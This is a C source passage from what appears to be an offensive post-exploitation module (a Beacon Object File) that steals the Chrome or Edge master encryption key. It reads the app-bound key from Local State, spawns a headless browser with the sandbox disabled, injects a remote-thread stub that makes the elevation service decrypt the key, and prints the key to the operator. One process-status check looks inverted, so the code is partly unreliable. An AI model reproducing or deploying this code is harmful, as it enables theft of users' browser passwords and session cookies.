// Registry: App Paths -> browser exe (chars_out receives length w/o NUL)
#define FALLBACK0 L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
#define FALLBACK1 L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
static BOOL resolve_browser_exe(int browser, WCHAR* out, DWORD outchars,
                                SIZE_T* chars_out) {
    // subkey selected by branch (NOT runtime-indexed static pointer arrays:
    // MSVC x64 compiles those into __ImageBase-relative addressing that a
    // BOF loader cannot resolve)
    const WCHAR* subkey;
    if (browser == 0)
        subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe";
    else
        subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe";
    DWORD cb = outchars * sizeof(WCHAR);
    LONG rc = RegGetValueW(HKEY_LOCAL_MACHINE, subkey, NULL,
                           RRF_RT_REG_SZ, NULL, (PVOID)out, &cb);
    if (rc != ERROR_SUCCESS || out[0] == 0) {
        rc = RegGetValueW(HKEY_CURRENT_USER, subkey, NULL,
                          RRF_RT_REG_SZ, NULL, (PVOID)out, &cb);
    }
    if (rc == ERROR_SUCCESS && out[0] != 0) {
        *chars_out = cb / sizeof(WCHAR); // RegGetValueW cb includes the NUL
        return TRUE;
    }
    // last resort: standard locations
    const WCHAR* fb;
    SIZE_T n;
    if (browser == 0) { fb = FALLBACK0; n = (sizeof(FALLBACK0) / sizeof(WCHAR)) - 1; }
    else              { fb = FALLBACK1; n = (sizeof(FALLBACK1) / sizeof(WCHAR)) - 1; }
    abe_memcpy(out, fb, (n + 1) * sizeof(WCHAR));
    *chars_out = n;
    DWORD attrs = GetFileAttributesW(out);
    return (attrs != INVALID_FILE_ATTRIBUTES) ? TRUE : FALSE;
}

// ---------------------------------------------------------------------------
// Local State: pull app_bound_encrypted_key (base64, "APPB"-prefixed after
// decode)
static BYTE* read_local_state_key(const WCHAR* localappdata, SIZE_T la_chars,
                                  int browser, SIZE_T* blob_len) {
    // branch-selected literals (NOT runtime-indexed static pointer arrays:
    // those compile into __ImageBase-relative addressing, unresolvable in BOF)
    const WCHAR* path;
    SIZE_T p_chars;
    if (browser == 0) {
        path = L"\\Google\\Chrome\\User Data\\Local State";
        p_chars = (sizeof(L"\\Google\\Chrome\\User Data\\Local State") / sizeof(WCHAR)) - 1;
    } else {
        path = L"\\Microsoft\\Edge\\User Data\\Local State";
        p_chars = (sizeof(L"\\Microsoft\\Edge\\User Data\\Local State") / sizeof(WCHAR)) - 1;
    }
    static const char JSON_TAG[] = "app_bound_encrypted_key";

    WCHAR full[512];
    abe_memcpy(full, localappdata, la_chars * sizeof(WCHAR));
    abe_memcpy(full + la_chars, path, (p_chars + 1) * sizeof(WCHAR));

    HANDLE h = CreateFileW(full, GENERIC_READ, FILE_SHARE_READ |
                           FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE || size < 128) { CloseHandle(h); return NULL; }

    char* buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    DWORD got = 0;
    if (!ReadFile(h, buf, size, &got, NULL) || got != size) {
        HeapFree(GetProcessHeap(), 0, buf); CloseHandle(h); return NULL;
    }
    CloseHandle(h);

    LONG at = find_ascii_a(buf, size, JSON_TAG);
    if (at < 0) { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
    // advance past the tag to find ":\"...\""
    const char* p = buf + at + (sizeof(JSON_TAG) - 1);
    const char* end = buf + size;
    while (p < end && (*p == ' ' || *p == '\t')) p++;
    if (p >= end || *p != ':') { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
    p++;
    while (p < end && (*p == ' ' || *p == '\t')) p++;
    if (p >= end || *p != '"') { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
    p++;
    // collect base64 until closing quote
    SIZE_T b64cap = (SIZE_T)(end - p);
    char* b64 = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, b64cap + 1);
    if (!b64) { HeapFree(GetProcessHeap(), 0, buf); return NULL; }
    SIZE_T b64len = 0;
    while (p < end && *p != '"') { b64[b64len++] = *p++; }
    HeapFree(GetProcessHeap(), 0, buf);
    if (b64len < 16) { HeapFree(GetProcessHeap(), 0, b64); return NULL; }

    SIZE_T dec_cap = b64len;
    BYTE* dec = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dec_cap);
    if (!dec) { HeapFree(GetProcessHeap(), 0, b64); return NULL; }
    SIZE_T dec_len = 0;
    if (b64_decode(b64, b64len, dec, dec_cap, &dec_len) != 0) {
        HeapFree(GetProcessHeap(), 0, b64); HeapFree(GetProcessHeap(), 0, dec);
        return NULL;
    }
    HeapFree(GetProcessHeap(), 0, b64);

    // "APPB" magic (4 bytes) then the service blob (SYSTEM-DPAPI inside)
    if (dec_len < 32 || dec[0] != 'A' || dec[1] != 'P' || dec[2] != 'P' ||
        dec[3] != 'B') {
        HeapFree(GetProcessHeap(), 0, dec); return NULL;
    }
    abe_memcpy(dec, dec + 4, dec_len - 4); // forward copy, dst < src: safe
    dec_len -= 4;
    *blob_len = dec_len;
    return dec; // caller frees via HeapFree
}

// ---------------------------------------------------------------------------
// Resolve the function pointers handed to the stub
static BOOL resolve_stub_fns(ABE_PARAMS* p) {
    /* LoadLibrary (not GetModuleHandle): a beacon may not have ole32/oleaut32
     * mapped yet. Refcount leak on failure paths is irrelevant at op scale. */
    HMODULE ole32 = LoadLibraryW(L"ole32");
    HMODULE oleaut = LoadLibraryW(L"oleaut32");
    HMODULE kernel = GetModuleHandleW(L"kernel32");
    if (!ole32 || !oleaut || !kernel) return FALSE;

    p->pCoInitializeEx = (abe_u64)GetProcAddress(ole32, "CoInitializeEx");
    p->pCoCreateInstance = (abe_u64)GetProcAddress(ole32, "CoCreateInstance");
    p->pCoSetProxyBlanket = (abe_u64)GetProcAddress(ole32, "CoSetProxyBlanket");
    p->pSysAllocStringByteLen = (abe_u64)GetProcAddress(oleaut,
                                                        "SysAllocStringByteLen");
    p->pSysStringByteLen = (abe_u64)GetProcAddress(oleaut, "SysStringByteLen");
    p->pSysFreeString = (abe_u64)GetProcAddress(oleaut, "SysFreeString");
    p->pSleep = (abe_u64)GetProcAddress(kernel, "Sleep");
    return p->pCoInitializeEx && p->pCoCreateInstance &&
           p->pCoSetProxyBlanket &&
           p->pSysAllocStringByteLen && p->pSysStringByteLen &&
           p->pSysFreeString && p->pSleep;
}

// ---------------------------------------------------------------------------
void go(char* args, int alen) {
    datap* parser = BeaconData(args);
    int browser = 0;
    if (alen >= 4) browser = BeaconDataInt(parser); // 0=chrome 1=edge
    if (browser != 0 && browser != 1) browser = 0;

    WCHAR exe[MAX_PATH];
    SIZE_T exe_chars = 0;
    if (!resolve_browser_exe(browser, exe, MAX_PATH, &exe_chars)) {
        BeaconPrintf(OUTPUT_ERROR, "abe: browser exe not found (id=%d)", browser);
        return;
    }

    WCHAR localappdata[260];
    DWORD n = GetEnvironmentVariableW(L"LOCALAPPDATA", localappdata, 260);
    if (n == 0 || n >= 260) {
        BeaconPrintf(OUTPUT_ERROR, "abe: %%LOCALAPPDATA%% unavailable");
        return;
    }

    SIZE_T blob_len = 0;
    BYTE* wrapped = read_local_state_key(localappdata, (SIZE_T)n, browser,
                                         &blob_len);
    if (!wrapped) {
        BeaconPrintf(OUTPUT_ERROR,
            "abe: app_bound_encrypted_key not found in Local State (id=%d)",
            browser);
        return;
    }
    // post-APPB bytes go STRAIGHT to DecryptData (source: DecryptAppBoundString
    // in chrome/browser/os_crypt/app_bound_encryption_win.cc, with no user layer)
    BYTE* ablob = wrapped; // kept alive until cleanup
    BeaconPrintf(OUTPUT_INFO, "[*] app-bound material: %u bytes (post-APPB)",
                 (unsigned)blob_len);

    // ---- shared section ----------------------------------------------------
    HANDLE section = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
                                        PAGE_READWRITE, 0, 4096, NULL);
    if (!section) {
        BeaconPrintf(OUTPUT_ERROR, "abe: CreateFileMapping failed GLE=%u",
                     GetLastError());
        HeapFree(GetProcessHeap(), 0, ablob);
        return;
    }
    BYTE* view = (BYTE*)MapViewOfFile(section, FILE_MAP_ALL_ACCESS, 0, 0, 4096);
    if (!view) {
        BeaconPrintf(OUTPUT_ERROR, "abe: MapViewOfFile failed GLE=%u",
                     GetLastError());
        CloseHandle(section); HeapFree(GetProcessHeap(), 0, ablob);
        return;
    }
    memset(view, 0, ABE_SEC_SIZE);

    // ---- spawn browser: headless, throwaway profile, started normally
    // (never CREATE_SUSPENDED; a suspended-before-entry process faults in
    // CoInitializeEx under a remote COM thread: 0xC0000005). Headless keeps
    // the desktop clean; the throwaway --user-data-dir avoids the singleton
    // handoff when the operator's own browser is running. The elevation
    // service validates only the image path, and the app-bound blob is
    // self-contained, so a temp profile is irrelevant to the decrypt.
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    static const WCHAR HEADLESS_ARGS[] =
        L" --headless=new --disable-gpu --disable-direct-composition"
        L" --log-level=3 --no-first-run --no-default-browser-check"
        L" --no-sandbox --user-data-dir=";
    /* unique dir per run: stale singleton locks from orphaned children of a
     * prior run would otherwise make the next spawn hand off and exit */
    static const WCHAR TMPDIR[] = L"abe_"; /* GetTempPathW ends with a slash */
    WCHAR tempbase[300];
    DWORD tn = GetTempPathW(280, tempbase);
    if (tn == 0 || tn >= 280) {
        BeaconPrintf(OUTPUT_ERROR, "abe: GetTempPathW failed");
        UnmapViewOfFile(view); CloseHandle(section);
        HeapFree(GetProcessHeap(), 0, ablob);
        return;
    }
    // Edge's launcher re-execs the versioned binary and exits (killing our
    // handle); prefer the versioned exe when present. Chrome's version dir
    // has no exe, so this is a no-op there.
    {
        SIZE_T dl = exe_chars;
        while (dl > 0 && exe[dl - 1] != L'\\') dl--;
        if (dl > 0 && dl < 280) {
            WCHAR mask[304];
            abe_memcpy(mask, exe, dl * sizeof(WCHAR));
            mask[dl] = L'\\'; mask[dl + 1] = L'*'; mask[dl + 2] = 0;
            WIN32_FIND_DATAW fd;
            HANDLE fh = FindFirstFileW(mask, &fd);
            if (fh != INVALID_HANDLE_VALUE) {
                do {
                    if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                        continue;
                    if (fd.cFileName[0] < L'0' || fd.cFileName[0] > L'9')
                        continue;
                    WCHAR cand[320];
                    SIZE_T k = dl;
                    abe_memcpy(cand, exe, k * sizeof(WCHAR));
                    cand[k++] = L'\\';
                    SIZE_T nl = 0;
                    while (fd.cFileName[nl]) nl++;
                    abe_memcpy(cand + k, fd.cFileName, nl * sizeof(WCHAR));
                    k += nl;
                    cand[k++] = L'\\';
                    SIZE_T el = exe_chars - dl;
                    abe_memcpy(cand + k, exe + dl, el * sizeof(WCHAR));
                    k += el;
                    cand[k] = 0;
                    if (GetFileAttributesW(cand) != INVALID_FILE_ATTRIBUTES) {
                        abe_memcpy(exe, cand, (k + 1) * sizeof(WCHAR));
                        exe_chars = k;
                        break;
                    }
                } while (FindNextFileW(fh, &fd));
                FindClose(fh);
            }
        }
    }
    /* heap, not stack: go() frame must stay under one page or MSVC emits
     * __chkstk + __ImageBase references; unresolvable in a BOF COFF */
    WCHAR* cmdline = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                       1024 * sizeof(WCHAR));
    if (!cmdline) {
        UnmapViewOfFile(view); CloseHandle(section);
        HeapFree(GetProcessHeap(), 0, ablob);
        return;
    }
    {
        /* Chromium re-parses GetCommandLineW: quote the spaced exe path or
         * Edge self-terminates with exit 13 (mangled argv) */
        WCHAR* w = cmdline;
        *w++ = L'"';
        abe_memcpy(w, exe, exe_chars * sizeof(WCHAR)); w += exe_chars;
        *w++ = L'"';
        abe_memcpy(w, HEADLESS_ARGS, sizeof(HEADLESS_ARGS) - sizeof(WCHAR));
        w += (sizeof(HEADLESS_ARGS) / sizeof(WCHAR)) - 1;
        abe_memcpy(w, tempbase, tn * sizeof(WCHAR)); w += tn;
        abe_memcpy(w, TMPDIR, (sizeof(TMPDIR) / sizeof(WCHAR)) - 1);
        w += (sizeof(TMPDIR) / sizeof(WCHAR)) - 1;
        /* GetTickCount() as 8 hex digits, hand-rolled (no CRT) */
        abe_u32 tick = GetTickCount();
        static const WCHAR HEXD[] = L"0123456789abcdef";
        for (int sh = 28; sh >= 0; sh -= 4) *w++ = HEXD[(tick >> sh) & 0xF];
        *w = 0;
    }
    cmdline[1023] = 0;
    /* redirect the child's stdout/stderr to NUL so the headless instance's
     * GPU-probe spam doesn't inherit the beacon's console */
    static const WCHAR NULDEV[] = L"NUL";
    SECURITY_ATTRIBUTES saInh;
    memset(&saInh, 0, sizeof(saInh));
    saInh.nLength = sizeof(saInh);
    saInh.bInheritHandle = TRUE;
    HANDLE hNul = CreateFileW(NULDEV, GENERIC_WRITE, FILE_SHARE_WRITE,
                              &saInh, OPEN_EXISTING, 0, NULL);
    BOOL haveNul = (hNul != NULL && hNul != INVALID_HANDLE_VALUE);
    if (haveNul) {
        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdInput = NULL;
        si.hStdOutput = hNul;
        si.hStdError = hNul;
    }
    /* headless spawn runs normally (no window); suspension breaks Edge's
     * init; it exits 13 when its main thread starts from ResumeThread */
    if (!CreateProcessW(exe, cmdline, NULL, NULL, haveNul,
                        0, NULL, NULL, &si, &pi)) {
        BeaconPrintf(OUTPUT_ERROR, "abe: CreateProcessW failed GLE=%u",
                     GetLastError());
        if (haveNul) CloseHandle(hNul);
        HeapFree(GetProcessHeap(), 0, cmdline);
        UnmapViewOfFile(view); CloseHandle(section);
        HeapFree(GetProcessHeap(), 0, ablob);
        return;
    }
    if (haveNul) CloseHandle(hNul);
    HANDLE hProc = pi.hProcess;
    Sleep(1500); // headless init completes; no window either way
    {
        DWORD st2 = 0;
        GetExitCodeProcess(hProc, &st2);
        if (st2 == STILL_ACTIVE) {
            BeaconPrintf(OUTPUT_ERROR,
                "abe: spawned browser exited early st=0x%08x", st2);
            goto cleanup_terminate;
        }
    }

    // ---- target memory: [RX code][RW data] ----------------------------------
    BYTE* code_base = (BYTE*)VirtualAllocEx(hProc, NULL, STUB_BLOB_SIZE,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    BYTE* data_base = (BYTE*)VirtualAllocEx(hProc, NULL,
                        STUB_PARAMS_SIZE + sizeof(g_chain_chrome) + 4096,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!code_base || !data_base) {
        BeaconPrintf(OUTPUT_ERROR, "abe: VirtualAllocEx failed GLE=%u",
                     GetLastError());
        goto cleanup_terminate;
    }
    if (!WriteProcessMemory(hProc, code_base, stub_blob, STUB_BLOB_SIZE, NULL)) {
        BeaconPrintf(OUTPUT_ERROR, "abe: WriteProcessMemory(code) GLE=%u",
                     GetLastError());
        goto cleanup_terminate;
    }
    DWORD oldp = 0;
    if (!VirtualProtectEx(hProc, code_base, STUB_BLOB_SIZE, PAGE_EXECUTE_READ,
                          &oldp)) {
        BeaconPrintf(OUTPUT_ERROR, "abe: VirtualProtectEx(PAGE_EXECUTE_READ) GLE=%u",
                     GetLastError());
        goto cleanup_terminate;
    }

    // data region layout: [ABE_PARAMS][candidates][blob]
    BYTE* cand_base = data_base + STUB_PARAMS_SIZE;
    BYTE* blob_base = cand_base + sizeof(g_chain_chrome);
    {
        const ABE_CANDIDATE* chain =
            (browser == 0) ? g_chain_chrome : g_chain_edge;
        DWORD chain_bytes = (DWORD)((browser == 0) ? sizeof(g_chain_chrome)
                                                   : sizeof(g_chain_edge));
        UINT ncand = chain_bytes / sizeof(ABE_CANDIDATE);
        if (!WriteProcessMemory(hProc, cand_base, chain, chain_bytes, NULL) ||
            !WriteProcessMemory(hProc, blob_base, ablob, blob_len, NULL)) {
            BeaconPrintf(OUTPUT_ERROR, "abe: WriteProcessMemory(data) GLE=%u",
                         GetLastError());
            goto cleanup_terminate;
        }

        ABE_PARAMS p; memset(&p, 0, sizeof(p));
        if (!resolve_stub_fns(&p)) {
            BeaconPrintf(OUTPUT_ERROR, "abe: failed to resolve ole32/oleaut32");
            goto cleanup_terminate;
        }
        abe_memcpy(&p.candidates, &cand_base, sizeof(p.candidates)); // ptr value
        p.ncand = ncand;
        abe_memcpy(&p.blob, &blob_base, sizeof(p.blob));             // ptr value
        p.blob_len = (abe_u32)blob_len;
        // out = target-side section view (mapped next)
        SIZE_T viewsize = 0;
        PVOID tview = NULL;
        NTSTATUS st = NtMapViewOfSection(section, hProc, &tview, 0, 0, NULL,
                                         &viewsize, 1 /* ViewShare */, 0,
                                         PAGE_READWRITE);
        if (st != 0) {
            BeaconPrintf(OUTPUT_ERROR, "abe: NtMapViewOfSection failed st=0x%08x",
                         (unsigned)st);
            goto cleanup_terminate;
        }
        abe_memcpy(&p.out, &tview, sizeof(p.out));
        if (!WriteProcessMemory(hProc, data_base, &p, sizeof(p), NULL)) {
            BeaconPrintf(OUTPUT_ERROR, "abe: WriteProcessMemory(params) GLE=%u",
                         GetLastError());
            goto cleanup_terminate;
        }

        // ---- run the stub ----------------------------------------------------
        HANDLE th = CreateRemoteThread(hProc, NULL, 0,
            (LPTHREAD_START_ROUTINE)code_base, data_base, 0, NULL);
        if (!th) {
            BeaconPrintf(OUTPUT_ERROR, "abe: CreateRemoteThread failed GLE=%u",
                         GetLastError());
            goto cleanup_terminate;
        }

        // ---- wait for the section flag ---------------------------------------
        BOOL ok = FALSE;
        for (int t = 0; t < 150; t++) {
            Sleep(100);
            ULONG done = *(volatile ULONG*)(view + ABE_SEC_DONE);
            if (done == ABE_DONE_OK) { ok = TRUE; break; }
            if (done == ABE_DONE_ERR) break;
        }
        if (!ok) {
            ULONG done = *(volatile ULONG*)(view + ABE_SEC_DONE);
            ULONG hr = *(volatile ULONG*)(view + ABE_SEC_HR);
            BeaconPrintf(OUTPUT_ERROR,
                "abe: stub failed done=%u hr=0x%08x (0x8007xxxx = service "
                "validation refused; check browser profile state)", done, hr);
        } else {
            char b64[64];
            b64_encode(view + ABE_SEC_KEY, 32, b64, sizeof(b64));
            BeaconPrintf(OUTPUT_INFO, "[+] master key (base64, 32 bytes):");
            BeaconPrintf(OUTPUT_INFO, "%s", b64);
        }
        CloseHandle(th);
        goto cleanup_terminate;
    }

cleanup_terminate:
    TerminateProcess(hProc, 0);
    CloseHandle(pi.hThread);
    CloseHandle(hProc);
    UnmapViewOfFile(view);
    CloseHandle(section);
    if (ablob) HeapFree(GetProcessHeap(), 0, ablob);
    HeapFree(GetProcessHeap(), 0, cmdline);
}
